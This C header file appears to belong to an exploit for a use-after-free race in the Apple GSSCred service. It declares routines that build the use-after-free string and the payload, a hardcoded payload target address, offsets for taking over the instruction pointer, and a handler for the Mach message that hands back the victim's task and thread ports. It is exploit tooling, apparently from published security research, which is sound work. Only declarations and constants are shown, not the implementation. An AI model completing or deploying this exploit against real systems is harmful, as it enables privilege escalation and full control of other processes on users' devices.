#ifndef GSSCRED_RACE__PAYLOAD_H_
#define GSSCRED_RACE__PAYLOAD_H_

#include <mach/mach.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>

// ---- Generic payload generation ----------------------------------------------------------------

// The size of the uaf_string parameter to build_payload().
static const size_t GSSCRED_RACE_UAF_STRING_SIZE = 0x20;

// The size and target address of the payload.
static const size_t   GSSCRED_RACE_PAYLOAD_SIZE    = 0x4000;
static const uint64_t GSSCRED_RACE_PAYLOAD_ADDRESS = 0x0000000120204000;

// Build the UAF string and payload.
bool gsscred_race_build_exploit_payload(char *uaf_string, uint8_t *payload);

// Result codes for gsscred_race_process_exploit_message.
enum process_exploit_message_result {
	PROCESS_EXPLOIT_MESSAGE_RESULT_SUCCESS,
	PROCESS_EXPLOIT_MESSAGE_RESULT_CONTINUE,
	PROCESS_EXPLOIT_MESSAGE_RESULT_KILL_AND_RETRY,
};

// Process the Mach message sent by the exploit payload and return the task port and thread port.
// The thread is returned suspended.
enum process_exploit_message_result gsscred_race_process_exploit_message(
		const mach_msg_header_t *exploit_message,
		mach_port_t *task_port, mach_port_t *thread_port);

// ---- Platform-specific payload generation ------------------------------------------------------

// The offset into the payload at which to store the instruction pointer address to jump to.
extern const size_t PAYLOAD_OFFSET_PC;

// The offset into the payload at which the first argument will point when we get instruction
// pointer control.
extern const size_t PAYLOAD_OFFSET_ARG1;

// The Mach message ID of the Mach message sent by the exploit payload.
static const uint32_t EXPLOIT_MACH_MESSAGE_ID = 0x414200ab;

// The type of a function for platform-specific payload generation.
typedef void (*platform_payload_generator_fn)(uint8_t *payload);


// The type of a function for processing a message generated by a payload.
typedef enum process_exploit_message_result (*payload_message_processor_fn)(
		const mach_msg_header_t *hdr,
		mach_port_t *task_port, mach_port_t *thread_port);

// A helper routine to check whether the task port contained in the exploit message looks valid.
bool check_task_port(mach_port_t task_port);

#endif
